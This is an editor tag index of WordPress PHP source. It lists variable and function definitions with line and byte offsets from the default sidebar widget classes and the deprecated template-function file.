		$title = esc_attr( $instance['title'] );title63,1726
		$exclude = esc_attr( $instance['exclude'] );exclude64,1769
class WP_Widget_Links extends WP_Widget {WP_Widget_Links90,3115
	function __construct() {__construct92,3158
		$widget_ops = array('description' => __( "Your blogroll" ) );widget_ops93,3184
	function widget( $args, $instance ) {widget97,3310
		$show_description = isset($instance['description']) ? $instance['description'] : false;show_description100,3379
		$show_name = isset($instance['name']) ? $instance['name'] : false;show_name101,3469
		$show_rating = isset($instance['rating']) ? $instance['rating'] : false;show_rating102,3538
		$show_images = isset($instance['images']) ? $instance['images'] : true;show_images103,3613
		$category = isset($instance['category']) ? $instance['category'] : false;category104,3687
		$orderby = isset( $instance['orderby'] ) ? $instance['orderby'] : 'name';orderby105,3763
		$order = $orderby == 'rating' ? 'DESC' : 'ASC';order106,3839
		$limit = isset( $instance['limit'] ) ? $instance['limit'] : -1;limit107,3889
		$before_widget = preg_replace('/id="[^"]*"/','id="%id"', $before_widget);before_widget109,3956
	function update( $new_instance, $old_instance ) {update121,4507
		$new_instance = (array) $new_instance;new_instance122,4558
		$instance = array( 'images' => 0, 'name' => 0, 'description' => 0, 'rating' => 0 );instance123,4599
		foreach ( $instance as $field => $val ) {field124,4685
	function form( $instance ) {form139,5159
		$instance = wp_parse_args( (array) $instance, array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ) );instance142,5203
		$link_cats = get_terms( 'link_category' );link_cats143,5396
		if ( ! $limit = intval( $instance['limit'] ) )limit144,5441
			$limit = -1;limit145,5490
		<input id="<?php echo $this->get_field_id('limit'); ?>" name="<?php echo $this->get_field_name('limit'); ?>" type="text" value="<?php echo $limit == -1 ? '' : intval( $limit ); ?>" size="3" />limit179,8117
class WP_Widget_Search extends WP_Widget {WP_Widget_Search190,8381
	function __construct() {__construct192,8425
		$widget_ops = array('classname' => 'widget_search', 'description' => __( "A search form for your site") );widget_ops193,8451
	function widget( $args, $instance ) {widget197,8624
		$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );title199,8681
	function form( $instance ) {form211,8991
		$instance = wp_parse_args( (array) $instance, array( 'title' => '') );instance212,9021
		$title = $instance['title'];title213,9094
	function update( $new_instance, $old_instance ) {update219,9415
		$instance = $old_instance;instance220,9466
		$new_instance = wp_parse_args((array) $new_instance, array( 'title' => ''));new_instance221,9495
class WP_Widget_Archives extends WP_Widget {WP_Widget_Archives233,9712
	function __construct() {__construct235,9758
		$widget_ops = array('classname' => 'widget_archive', 'description' => __( 'A monthly archive of your site&#8217;s posts') );widget_ops236,9784
	function widget( $args, $instance ) {widget240,9979
		$c = ! empty( $instance['count'] ) ? '1' : '0';c242,10036
		$d = ! empty( $instance['dropdown'] ) ? '1' : '0';d243,10086
		$title = apply_filters('widget_title', empty($instance['title']) ? __('Archives') : $instance['title'], $instance, $this->id_base);title244,10139
	function update( $new_instance, $old_instance ) {update265,10908
		$instance = $old_instance;instance266,10959
		$new_instance = wp_parse_args( (array) $new_instance, array( 'title' => '', 'count' => 0, 'dropdown' => '') );new_instance267,10988
	function form( $instance ) {form275,11301
		$instance = wp_parse_args( (array) $instance, array( 'title' => '', 'count' => 0, 'dropdown' => '') );instance276,11331
		$title = strip_tags($instance['title']);title277,11436
		$count = $instance['count'] ? 'checked="checked"' : '';count278,11479
		$dropdown = $instance['dropdown'] ? 'checked="checked"' : '';dropdown279,11537
class WP_Widget_Meta extends WP_Widget {WP_Widget_Meta298,12562
	function __construct() {__construct300,12604
		$widget_ops = array('classname' => 'widget_meta', 'description' => __( "Log in/out, admin, feed and WordPress links") );widget_ops301,12630
	function widget( $args, $instance ) {widget305,12813
		$title = apply_filters('widget_title', empty($instance['title']) ? __('Meta') : $instance['title'], $instance, $this->id_base);title307,12870
	function update( $new_instance, $old_instance ) {update328,13924
		$instance = $old_instance;instance329,13975
	function form( $instance ) {form335,14088
		$instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );instance336,14118
		$title = strip_tags($instance['title']);title337,14192
class WP_Widget_Calendar extends WP_Widget {WP_Widget_Calendar349,14580
	function __construct() {__construct351,14626
		$widget_ops = array('classname' => 'widget_calendar', 'description' => __( 'A calendar of your site&#8217;s posts') );widget_ops352,14652
	function widget( $args, $instance ) {widget356,14841
		$title = apply_filters('widget_title', empty($instance['title']) ? '&nbsp;' : $instance['title'], $instance, $this->id_base);title358,14898
	function update( $new_instance, $old_instance ) {update368,15208
		$instance = $old_instance;instance369,15259
	function form( $instance ) {form375,15372
		$instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );instance376,15402
		$title = strip_tags($instance['title']);title377,15476
class WP_Widget_Text extends WP_Widget {WP_Widget_Text390,15861
	function __construct() {__construct392,15903
		$widget_ops = array('classname' => 'widget_text', 'description' => __('Arbitrary text or HTML'));widget_ops393,15929
		$control_ops = array('width' => 400, 'height' => 350);control_ops394,16029
	function widget( $args, $instance ) {widget398,16160
		$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );title400,16217
		$text = apply_filters( 'widget_text', empty( $instance['text'] ) ? '' : $instance['text'], $instance );text401,16343
	function update( $new_instance, $old_instance ) {update409,16688
		$instance = $old_instance;instance410,16739
	function form( $instance ) {form420,17144
		$instance = wp_parse_args( (array) $instance, array( 'title' => '', 'text' => '' ) );instance421,17174
		$title = strip_tags($instance['title']);title422,17262
		$text = esc_textarea($instance['text']);text423,17305
class WP_Widget_Categories extends WP_Widget {WP_Widget_Categories440,18205
	function __construct() {__construct442,18253
		$widget_ops = array( 'classname' => 'widget_categories', 'description' => __( "A list or dropdown of categories" ) );widget_ops443,18279
	function widget( $args, $instance ) {widget447,18471
		$title = apply_filters('widget_title', empty( $instance['title'] ) ? __( 'Categories' ) : $instance['title'], $instance, $this->id_base);title450,18531
		$c = ! empty( $instance['count'] ) ? '1' : '0';c451,18671
		$h = ! empty( $instance['hierarchical'] ) ? '1' : '0';h452,18721
		$d = ! empty( $instance['dropdown'] ) ? '1' : '0';d453,18778
		$cat_args = array('orderby' => 'name', 'show_count' => $c, 'hierarchical' => $h);cat_args459,18919
	function onCatChange() {onCatChange469,19264
	function update( $new_instance, $old_instance ) {update493,19700
		$instance = $old_instance;instance494,19751
	function form( $instance ) {form503,20073
		$instance = wp_parse_args( (array) $instance, array( 'title' => '') );instance505,20116
		$title = esc_attr( $instance['title'] );title506,20189
		$count = isset($instance['count']) ? (bool) $instance['count'] :false;count507,20232
		$hierarchical = isset( $instance['hierarchical'] ) ? (bool) $instance['hierarchical'] : false;hierarchical508,20305
		$dropdown = isset( $instance['dropdown'] ) ? (bool) $instance['dropdown'] : false;dropdown509,20402
class WP_Widget_Recent_Posts extends WP_Widget {WP_Widget_Recent_Posts532,21721
	function __construct() {__construct534,21771
		$widget_ops = array('classname' => 'widget_recent_entries', 'description' => __( "The most recent posts on your site") );widget_ops535,21797
		$this->alt_option_name = 'widget_recent_entries';alt_option_name537,21993
	function widget($args, $instance) {widget544,22254
		$cache = wp_cache_get('widget_recent_posts', 'widget');cache545,22291
			$cache = array();cache548,22377
		$title = apply_filters('widget_title', empty($instance['title']) ? __('Recent Posts') : $instance['title'], $instance, $this->id_base);title561,22610
		if ( empty( $instance['number'] ) || ! $number = absint( $instance['number'] ) )number562,22748
 			$number = 10;number563,22831
		$r = new WP_Query( apply_filters( 'widget_posts_args', array( 'posts_per_page' => $number, 'no_found_rows' => true, 'post_status' => 'publish', 'ignore_sticky_posts' => true ) ) );r565,22850
	function update( $new_instance, $old_instance ) {update586,23695
		$instance = $old_instance;instance587,23746
		$alloptions = wp_cache_get( 'alloptions', 'options' );alloptions592,23921
	function flush_widget_cache() {flush_widget_cache599,24099
	function form( $instance ) {form603,24188
		$title = isset($instance['title']) ? esc_attr($instance['title']) : '';title604,24218
		$number = isset($instance['number']) ? absint($instance['number']) : 5;number605,24292
class WP_Widget_Recent_Comments extends WP_Widget {WP_Widget_Recent_Comments621,24994
	function __construct() {__construct623,25047
		$widget_ops = array('classname' => 'widget_recent_comments', 'description' => __( 'The most recent comments' ) );widget_ops624,25073
		$this->alt_option_name = 'widget_recent_comments';alt_option_name626,25267
	function recent_comments_style() {recent_comments_style635,25601
	function flush_widget_cache() {flush_widget_cache644,25932
	function widget( $args, $instance ) {widget648,26024
		$cache = wp_cache_get('widget_recent_comments', 'widget');cache651,26094
			$cache = array();cache654,26186
 		$output = '';output665,26416
		$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? __( 'Recent Comments' ) : $instance['title'], $instance, $this->id_base );title666,26433
		if ( empty( $instance['number'] ) || ! $number = absint( $instance['number'] ) )number668,26581
 			$number = 5;number669,26664
		$comments = get_comments( apply_filters( 'widget_comments_args', array( 'number' => $number, 'status' => 'approve', 'post_status' => 'publish' ) ) );comments671,26682
	function update( $new_instance, $old_instance ) {update690,27539
		$instance = $old_instance;instance691,27590
		$alloptions = wp_cache_get( 'alloptions', 'options' );alloptions696,27769
	function form( $instance ) {form703,27949
		$title = isset($instance['title']) ? esc_attr($instance['title']) : '';title704,27979
		$number = isset($instance['number']) ? absint($instance['number']) : 5;number705,28053
class WP_Widget_RSS extends WP_Widget {WP_Widget_RSS721,28746
	function __construct() {__construct723,28787
		$widget_ops = array( 'description' => __('Entries from any RSS or Atom feed') );widget_ops724,28813
		$control_ops = array( 'width' => 400, 'height' => 200 );control_ops725,28896
	function widget($args, $instance) {widget729,29029
		$url = ! empty( $instance['url'] ) ? $instance['url'] : '';url736,29166
			$url = substr($url, 1);url738,29270
		$rss = fetch_feed($url);rss747,29458
		$title = $instance['title'];title748,29485
		$desc = '';desc749,29516
		$link = '';link750,29530
			$desc = esc_attr(strip_tags(@html_entity_decode($rss->get_description(), ENT_QUOTES, get_option('blog_charset'))));desc753,29576
				$title = esc_html(strip_tags($rss->get_title()));title755,29719
			$link = esc_url(strip_tags($rss->get_permalink()));link756,29773
				$link = substr($link, 1);link758,29873
			$title = empty($desc) ? __('Unknown Feed') : $desc;title762,29931
		$title = apply_filters('widget_title', $title, $instance, $this->id_base);title764,29987
		$url = esc_url(strip_tags($url));url765,30064
		$icon = includes_url('images/rss.png');icon766,30100
			$title = "<a class='rsswidget' href='$url' title='" . esc_attr__( 'Syndicate this content' ) ."'><img style='border:0' width='14' height='14' src='$icon' alt='RSS' /></a> <a class='rsswidget' href='$link' title='$desc'>$title</a>";title768,30158
	function update($new_instance, $old_instance) {update781,30617
		$testurl = ( isset( $new_instance['url'] ) && ( !isset( $old_instance['url'] ) || ( $new_instance['url'] != $old_instance['url'] ) ) );testurl782,30666
	function form($instance) {form786,30867
			$instance = array( 'title' => '', 'url' => '', 'items' => 10, 'error' => false, 'show_summary' => 0, 'show_author' => 0, 'show_date' => 0 );instance789,30922
function wp_widget_rss_output( $rss, $args = array() ) {wp_widget_rss_output804,31299
function wp_widget_rss_output( $rss, $args = array() ) {args804,31299
		$rss = fetch_feed($rss);rss806,31384
		$args = $rss;args808,31464
		$rss = fetch_feed($rss['url']);rss809,31480
	$default_args = array( 'show_author' => 0, 'show_date' => 0, 'show_summary' => 0 );default_args820,31762
	$args = wp_parse_args( $args, $default_args );args821,31847
	$items = (int) $items;items824,31926
		$items = 10;items826,31984
	$show_summary  = (int) $show_summary;show_summary827,31999
	$show_author   = (int) $show_author;show_author828,32038
	$show_date     = (int) $show_date;show_date829,32076
		$link = $item->get_link();link840,32377
			$link = substr($link, 1);link842,32450
		$link = esc_url(strip_tags($link));link843,32479
		$title = esc_attr(strip_tags($item->get_title()));title844,32517
			$title = __('Untitled');title846,32593
		$desc = str_replace( array("\n", "\r"), ' ', esc_attr( strip_tags( @html_entity_decode( $item->get_description(), ENT_QUOTES, get_option('blog_charset') ) ) ) );desc848,32622
		$desc = wp_html_excerpt( $desc, 360 );desc849,32786
			$desc = substr( $desc, 0, -5 ) . '[&hellip;]';desc853,32927
		$desc = esc_html( $desc );desc857,33055
			$summary = "<div class='rssSummary'>$desc</div>";summary860,33110
			$summary = '';summary862,33174
		$date = '';date865,33197
			$date = $item->get_date( 'U' );date867,33233
				$date = ' <span class="rss-date">' . date_i18n( get_option( 'date_format' ), $date ) . '</span>';date870,33287
		$author = '';author874,33399
			$author = $item->get_author();author876,33439
				$author = $author->get_name();author878,33504
				$author = ' <cite>' . esc_html( strip_tags( $author ) ) . '</cite>';author879,33539
		if ( $link == '' ) {link883,33622
function wp_widget_rss_form( $args, $inputs = null ) {wp_widget_rss_form906,34229
function wp_widget_rss_form( $args, $inputs = null ) {inputs906,34229
	$default_inputs = array( 'url' => true, 'title' => true, 'items' => true, 'show_summary' => true, 'show_author' => true, 'show_date' => true );default_inputs908,34285
	$inputs = wp_parse_args( $inputs, $default_inputs );inputs909,34430
	$number = esc_attr( $number );number913,34535
	$title  = esc_attr( $title );title914,34567
	$url    = esc_url( $url );url915,34598
	$items  = (int) $items;items916,34626
		$items  = 10;items918,34685
	$show_summary   = (int) $show_summary;show_summary919,34701
	$show_author    = (int) $show_author;show_author920,34741
	$show_date      = (int) $show_date;show_date921,34780
		for ( $i = 1; $i <= 20; ++$i )i937,35797
			echo "<option value='$i' " . ( $items == $i ? "selected='selected'" : '' ) . ">$i</option>";items938,35830
			$id = str_replace( '_', '-', $input );id954,37087
function wp_widget_rss_process( $widget_rss, $check_feed = true ) {wp_widget_rss_process978,37936
function wp_widget_rss_process( $widget_rss, $check_feed = true ) {check_feed978,37936
	$items = (int) $widget_rss['items'];items979,38004
		$items = 10;items981,38076
	$url           = esc_url_raw(strip_tags( $widget_rss['url'] ));url982,38091
	$title         = trim(strip_tags( $widget_rss['title'] ));title983,38156
	$show_summary  = isset($widget_rss['show_summary']) ? (int) $widget_rss['show_summary'] : 0;show_summary984,38216
	$show_author   = isset($widget_rss['show_author']) ? (int) $widget_rss['show_author'] :0;show_author985,38310
	$show_date     = isset($widget_rss['show_date']) ? (int) $widget_rss['show_date'] : 0;show_date986,38401
		$rss = fetch_feed($url);rss989,38512
		$error = false;error990,38539
		$link = '';link991,38557
			$error = $rss->get_error_message();error993,38600
			$link = esc_url(strip_tags($rss->get_permalink()));link995,38650
				$link = substr($link, 1);link997,38750
class WP_Widget_Tag_Cloud extends WP_Widget {WP_Widget_Tag_Cloud1012,38989
	function __construct() {__construct1014,39036
		$widget_ops = array( 'description' => __( "Your most used tags in cloud format") );widget_ops1015,39062
	function widget( $args, $instance ) {widget1019,39218
		$current_taxonomy = $this->_get_current_taxonomy($instance);current_taxonomy1021,39275
			$title = $instance['title'];title1023,39376
				$title = __('Tags');title1026,39463
				$tax = get_taxonomy($current_taxonomy);tax1028,39500
				$title = $tax->labels->name;title1029,39544
		$title = apply_filters('widget_title', $title, $instance, $this->id_base);title1032,39586
	function update( $new_instance, $old_instance ) {update1043,39927
	function form( $instance ) {form1049,40142
		$current_taxonomy = $this->_get_current_taxonomy($instance);current_taxonomy1050,40172
				$tax = get_taxonomy($taxonomy);tax1057,40845
	function _get_current_taxonomy($instance) {_get_current_taxonomy1066,41150
 class WP_Nav_Menu_Widget extends WP_Widget {WP_Nav_Menu_Widget1079,41396
	function __construct() {__construct1081,41443
		$widget_ops = array( 'description' => __('Use this widget to add one of your custom menus as a widget.') );widget_ops1082,41469
	function widget($args, $instance) {widget1086,41652
		$nav_menu = ! empty( $instance['nav_menu'] ) ? wp_get_nav_menu_object( $instance['nav_menu'] ) : false;nav_menu1088,41703
	function update( $new_instance, $old_instance ) {update1105,42228
	function form( $instance ) {form1111,42437
		$title = isset( $instance['title'] ) ? $instance['title'] : '';title1112,42467
		$nav_menu = isset( $instance['nav_menu'] ) ? $instance['nav_menu'] : '';nav_menu1113,42533
		$menus = get_terms( 'nav_menu', array( 'hide_empty' => false ) );menus1116,42624
				$selected = $nav_menu == $menu->term_id ? ' selected="selected"' : '';selected1133,43470
function wp_widgets_init() {wp_widgets_init1151,43862

wordpress/wp-includes/deprecated.php,33218
function get_postdata($postid) {get_postdata26,458
	$post = &get_post($postid);post29,554
	$postdata = array (postdata31,584
function start_wp() {start_wp59,1331
function the_category_ID($echo = true) {the_category_ID81,1770
	$categories = get_the_category();categories85,1917
	$cat = $categories[0]->term_id;cat86,1952
function the_category_head($before='', $after='') {the_category_head105,2261
function the_category_head($before='', $after='') {after105,2261
	$categories = get_the_category();categories111,2461
	$currentcat = $categories[0]->category_id;currentcat112,2496
		$previouscat = $currentcat;previouscat117,2653
function previous_post($format='%', $previous='previous post: ', $title='yes', $in_same_cat='no', $limitprev=1, $excluded_categories='') {previous_post136,3011
function previous_post($format='%', $previous='previous post: ', $title='yes', $in_same_cat='no', $limitprev=1, $excluded_categories='') {previous136,3011
		$in_same_cat = false;in_same_cat141,3274
		$in_same_cat = true;in_same_cat143,3304
	$post = get_previous_post($in_same_cat, $excluded_categories);post145,3328
	$string = '<a href="'.get_permalink($post->ID).'">'.$previous;string150,3419
	$format = str_replace('%', $string, $format);format154,3598
function next_post($format='%', $next='next post: ', $title='yes', $in_same_cat='no', $limitnext=1, $excluded_categories='') {next_post173,3970
function next_post($format='%', $next='next post: ', $title='yes', $in_same_cat='no', $limitnext=1, $excluded_categories='') {next173,3970
		$in_same_cat = false;in_same_cat177,4216
		$in_same_cat = true;in_same_cat179,4246
	$post = get_next_post($in_same_cat, $excluded_categories);post181,4270
	$string = '<a href="'.get_permalink($post->ID).'">'.$next;string186,4357
	$format = str_replace('%', $string, $format);format190,4532
function user_can_create_post($user_id, $blog_id = 1, $category_id = 'None') {user_can_create_post207,4851
function user_can_create_post($user_id, $blog_id = 1, $category_id = 'None') {blog_id207,4851
	$author_data = get_userdata($user_id);author_data210,4999
function user_can_create_draft($user_id, $blog_id = 1, $category_id = 'None') {user_can_create_draft227,5336
function user_can_create_draft($user_id, $blog_id = 1, $category_id = 'None') {blog_id227,5336
	$author_data = get_userdata($user_id);author_data230,5485
function user_can_edit_post($user_id, $post_id, $blog_id = 1) {user_can_edit_post247,5808
function user_can_edit_post($user_id, $post_id, $blog_id = 1) {blog_id247,5808
	$author_data = get_userdata($user_id);author_data250,5941
	$post = get_post($post_id);post251,5981
	$post_author_data = get_userdata($post->post_author);post_author_data252,6010
function user_can_delete_post($user_id, $post_id, $blog_id = 1) {user_can_delete_post276,6578
function user_can_delete_post($user_id, $post_id, $blog_id = 1) {blog_id276,6578
function user_can_set_post_date($user_id, $blog_id = 1, $category_id = 'None') {user_can_set_post_date296,7081
function user_can_set_post_date($user_id, $blog_id = 1, $category_id = 'None') {blog_id296,7081
	$author_data = get_userdata($user_id);author_data299,7231
function user_can_edit_post_date($user_id, $post_id, $blog_id = 1) {user_can_edit_post_date316,7665
function user_can_edit_post_date($user_id, $post_id, $blog_id = 1) {blog_id316,7665
	$author_data = get_userdata($user_id);author_data319,7803
function user_can_edit_post_comments($user_id, $post_id, $blog_id = 1) {user_can_edit_post_comments336,8235
function user_can_edit_post_comments($user_id, $post_id, $blog_id = 1) {blog_id336,8235
function user_can_delete_post_comments($user_id, $post_id, $blog_id = 1) {user_can_delete_post_comments356,8806
function user_can_delete_post_comments($user_id, $post_id, $blog_id = 1) {blog_id356,8806
function user_can_edit_user($user_id, $other_user) {user_can_edit_user375,9294
	$user  = get_userdata($user_id);user378,9416
	$other = get_userdata($other_user);other379,9450
function get_linksbyname($cat_name = "noname", $before = '', $after = '<br />', $between = " ", $show_images = true, $orderby = 'id',get_linksbyname407,10881
function get_linksbyname($cat_name = "noname", $before = '', $after = '<br />', $between = " ", $show_images = true, $orderby = 'id',before407,10881
						 $show_description = true, $show_rating = false,show_description408,11015
						 $limit = -1, $show_updated = 0) {limit409,11070
	$cat_id = -1;cat_id412,11177
	$cat = get_term_by('name', $cat_name, 'link_category');cat413,11192
		$cat_id = $cat->term_id;cat_id415,11262
function wp_get_linksbyname($category, $args = '') {wp_get_linksbyname432,11683
function wp_get_linksbyname($category, $args = '') {args432,11683
	$defaults = array(defaults435,11804
	$r = wp_parse_args( $args, $defaults );r446,12023
 *	$links = get_linkobjectsbyname('fred');links455,12185
function get_linkobjectsbyname($cat_name = "noname" , $orderby = 'name', $limit = -1) {get_linkobjectsbyname473,12895
function get_linkobjectsbyname($cat_name = "noname" , $orderby = 'name', $limit = -1) {orderby473,12895
	$cat_id = -1;cat_id476,13049
	$cat = get_term_by('name', $cat_name, 'link_category');cat477,13064
		$cat_id = $cat->term_id;cat_id479,13134
 *	$links = get_linkobjects(1);links489,13305
function get_linkobjects($category = 0, $orderby = 'name', $limit = 0) {get_linkobjects527,14400
function get_linkobjects($category = 0, $orderby = 'name', $limit = 0) {orderby527,14400
	$links = get_bookmarks( array( 'category' => $category, 'orderby' => $orderby, 'limit' => $limit ) ) ;links530,14539
	$links_array = array();links_array532,14644
function get_linksbyname_withrating($cat_name = "noname", $before = '', $after = '<br />', $between = " ",get_linksbyname_withrating560,15880
function get_linksbyname_withrating($cat_name = "noname", $before = '', $after = '<br />', $between = " ",before560,15880
									$show_images = true, $orderby = 'id', $show_description = true, $limit = -1, $show_updated = 0) {show_images561,15987
function get_links_withrating($category = -1, $before = '', $after = '<br />', $between = " ", $show_images = true,get_links_withrating588,17413
function get_links_withrating($category = -1, $before = '', $after = '<br />', $between = " ", $show_images = true,before588,17413
							  $orderby = 'id', $show_description = true, $limit = -1, $show_updated = 0) {orderby589,17529
 * @deprecated No alternative function availableavailable600,17880
function get_autotoggle($id = 0) {get_autotoggle605,18037
function list_cats($optionall = 1, $all = 'All', $sort_column = 'ID', $sort_order = 'asc', $file = '', $list = true, $optiondates = 0,list_cats636,18734
function list_cats($optionall = 1, $all = 'All', $sort_column = 'ID', $sort_order = 'asc', $file = '', $list = true, $optiondates = 0,all636,18734
				   $optioncount = 0, $hide_empty = 1, $use_desc_for_title = 1, $children=false, $child_of=0, $categories=0,optioncount637,18869
				   $recurse=0, $feed = '', $feed_image = '', $exclude = '', $hierarchical=false) {recurse638,18981
	$query = compact('optionall', 'all', 'sort_column', 'sort_order', 'file', 'list', 'optiondates', 'optioncount', 'hide_empty', 'use_desc_for_title', 'children',query641,19139
function wp_list_cats($args = '') {wp_list_cats655,19583
	$r = wp_parse_args( $args );r658,19690
function dropdown_cats($optionall = 1, $all = 'All', $orderby = 'ID', $order = 'asc',dropdown_cats696,20645
function dropdown_cats($optionall = 1, $all = 'All', $orderby = 'ID', $order = 'asc',all696,20645
		$show_last_update = 0, $show_count = 0, $hide_empty = 1, $optionnone = false,show_last_update697,20731
		$selected = 0, $exclude = 0) {selected698,20811
	$show_option_all = '';show_option_all701,20919
		$show_option_all = $all;show_option_all703,20962
	$show_option_none = '';show_option_none705,20990
		$show_option_none = __('None');show_option_none707,21035
	$vars = compact('show_option_all', 'show_option_none', 'orderby', 'order',vars709,21070
	$query = add_query_arg($vars, '');query711,21223
function list_authors($optioncount = false, $exclude_admin = true, $show_fullname = false, $hide_empty = true, $feed = '', $feed_image = '') {list_authors729,21595
function list_authors($optioncount = false, $exclude_admin = true, $show_fullname = false, $hide_empty = true, $feed = '', $feed_image = '') {exclude_admin729,21595
	$args = compact('optioncount', 'exclude_admin', 'show_fullname', 'hide_empty', 'feed', 'feed_image');args732,21806
function wp_get_post_cats($blogid = '1', $post_ID = 0) {wp_get_post_cats746,22140
function wp_get_post_cats($blogid = '1', $post_ID = 0) {post_ID746,22140
function wp_set_post_cats($blogid = '1', $post_ID = 0, $post_categories = array()) {wp_set_post_cats764,22600
function wp_set_post_cats($blogid = '1', $post_ID = 0, $post_categories = array()) {post_ID764,22600
function get_archives($type='', $limit='', $format='html', $before = '', $after = '', $show_post_count = false) {get_archives783,23102
function get_archives($type='', $limit='', $format='html', $before = '', $after = '', $show_post_count = false) {limit783,23102
	$args = compact('type', 'limit', 'format', 'before', 'after', 'show_post_count');args785,23283
function get_author_link($echo = false, $author_id, $author_nicename = '') {get_author_link802,23703
function get_author_link($echo = false, $author_id, $author_nicename = '') {author_nicename802,23703
	$link = get_author_posts_url($author_id, $author_nicename);link805,23853
function link_pages($before='<br />', $after='<br />', $next_or_number='number', $nextpagelink='next page', $previouspagelink='previous page',link_pages829,24332
function link_pages($before='<br />', $after='<br />', $next_or_number='number', $nextpagelink='next page', $previouspagelink='previous page',after829,24332
					$pagelink='%', $more_file='') {pagelink830,24475
	$args = compact('before', 'after', 'next_or_number', 'nextpagelink', 'previouspagelink', 'pagelink', 'more_file');args833,24578
function get_settings($option) {get_settings848,24901
function permalink_link() {permalink_link862,25189
function permalink_single_rss($deprecated = '') {permalink_single_rss877,25487
function wp_get_links($args = '') {wp_get_links894,25923
		$cat_id = $args;cat_id898,26070
		$args = add_query_arg( 'category', $cat_id, $args );args899,26089
	$defaults = array(defaults902,26148
	$r = wp_parse_args( $args, $defaults );r918,26460
function get_links($category = -1, $before = '', $after = '<br />', $between = ' ', $show_images = true, $orderby = 'name',get_links948,27779
function get_links($category = -1, $before = '', $after = '<br />', $between = ' ', $show_images = true, $orderby = 'name',before948,27779
			$show_description = true, $show_rating = false, $limit = -1, $show_updated = 1, $echo = true) {show_description949,27903
	$order = 'ASC';order952,28068
		$order = 'DESC';order954,28125
		$orderby = substr($orderby, 1);orderby955,28144
	if ( $category == -1 ) //get_bookmarks uses '' to signify all categoriescategory958,28182
		$category = '';category959,28256
	$results = get_bookmarks(array('category' => $category, 'orderby' => $orderby, 'order' => $order, 'show_updated' => $show_updated, 'limit' => $limit));results961,28275
	$output = '';output966,28458
		$the_link = '#';the_link974,28720
			$the_link = esc_url($row->link_url);the_link976,28771
		$rel = $row->link_rel;rel977,28811
			$rel = ' rel="' . $rel . '"';rel979,28856
		$desc = esc_attr(sanitize_bookmark_field('link_description', $row->link_description, $row->link_id, 'display'));desc981,28890
		$name = esc_attr(sanitize_bookmark_field('link_name', $row->link_name, $row->link_id, 'display'));name982,29005
		$title = $desc;title983,29106
			$title = ' title="' . $title . '"';title990,29379
		$alt = ' alt="' . $name . '"';alt992,29419
		$target = $row->link_target;target994,29453
			$target = ' target="' . $target . '"';target996,29507
function get_links_list($order = 'name') {get_links_list1042,30702
	$order = strtolower($order);order1045,30815
	$direction = 'ASC';direction1048,30879
		$direction = 'DESC';direction1050,30936
		$order = substr($order,1);order1051,30959
		$direction = '';direction1055,31019
	$cats = get_categories(array('type' => 'link', 'orderby' => $order, 'order' => $direction, 'hierarchical' => 0));cats1057,31039
 * @deprecated {@internal Use function instead is unknown}}instead1080,31736
function links_popup_script($text = 'Links', $width=400, $height=400, $file='links.all.php', $count = true) {links_popup_script1088,32063
function links_popup_script($text = 'Links', $width=400, $height=400, $file='links.all.php', $count = true) {width1088,32063
		$counts = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->links");counts1092,32235
	$javascript = "<a href=\"#\" onclick=\"javascript:window.open('$file?popup=1', '_blank', 'width=$width,height=$height,scrollbars=yes,status=no'); return false\">";javascript1094,32301
function get_linkrating($link) {get_linkrating1113,32755
function get_linkcatname($id = 0) {get_linkcatname1129,33190
	$id = (int) $id;id1132,33291
	$cats = wp_get_link_cats($id);cats1137,33343
	$cat_id = (int) $cats[0]; // Take the first cat.cat_id1142,33432
	$cat = get_category($cat_id);cat1144,33483
function comments_rss_link($link_text = 'Comments RSS') {comments_rss_link1158,33725
function get_category_rss_link($echo = false, $cat_ID = 1) {get_category_rss_link1175,34133
function get_category_rss_link($echo = false, $cat_ID = 1) {cat_ID1175,34133
	$link = get_category_feed_link($cat_ID, 'rss2');link1178,34269
function get_author_rss_link($echo = false, $author_id = 1) {get_author_rss_link1197,34596
function get_author_rss_link($echo = false, $author_id = 1) {author_id1197,34596
	$link = get_author_feed_link($author_id);link1200,34731
function comments_rss() {comments_rss1216,35009
function create_user($username, $password, $email) {create_user1234,35480
function gzip_compression() {gzip_compression1244,35705
function get_commentdata( $comment_ID, $no_cache = 0, $include_unapproved = false ) {get_commentdata1262,36186
function get_commentdata( $comment_ID, $no_cache = 0, $include_unapproved = false ) {no_cache1262,36186
function get_catname( $cat_ID ) {get_catname1278,36602
function get_category_children( $id, $before = '/', $after = '', $visited = array() ) {get_category_children1297,37239
function get_category_children( $id, $before = '/', $after = '', $visited = array() ) {before1297,37239
	$chain = '';chain1302,37427
	$cat_ids = get_all_category_ids();cat_ids1304,37473
		if ( $cat_id == $id )cat_id1306,37552
		$category = get_category( $cat_id );category1309,37590
function get_the_author_description() {get_the_author_description1331,38188
function the_author_description() {the_author_description1344,38545
function get_the_author_login() {get_the_author_login1359,38940
function the_author_login() {the_author_login1372,39271
function get_the_author_firstname() {get_the_author_firstname1387,39642
function the_author_firstname() {the_author_firstname1400,39992
function get_the_author_lastname() {get_the_author_lastname1415,40374
function the_author_lastname() {the_author_lastname1428,40719
function get_the_author_nickname() {get_the_author_nickname1443,41095
function the_author_nickname() {the_author_nickname1456,41436
function get_the_author_email() {get_the_author_email1471,41804
function the_author_email() {the_author_email1484,42130
function get_the_author_icq() {get_the_author_icq1499,42494
function the_author_icq() {the_author_icq1512,42817
function get_the_author_yim() {get_the_author_yim1527,43183
function the_author_yim() {the_author_yim1540,43510
function get_the_author_msn() {get_the_author_msn1555,43870
function the_author_msn() {the_author_msn1568,44194
function get_the_author_aim() {get_the_author_aim1583,44554
function the_author_aim() {the_author_aim1596,44878
function get_author_name( $auth_id = false ) {get_author_name1612,45291
function get_author_name( $auth_id = false ) {auth_id1612,45291
function get_the_author_url() {get_the_author_url1627,45726
function the_author_url() {the_author_url1640,46059
function get_the_author_ID() {get_the_author_ID1655,46397
function the_author_ID() {the_author_ID1668,46707
function the_content_rss($more_link_text='(more...)', $stripteaser=0, $more_file='', $cut = 0, $encode_html = 0) {the_content_rss1707,48321
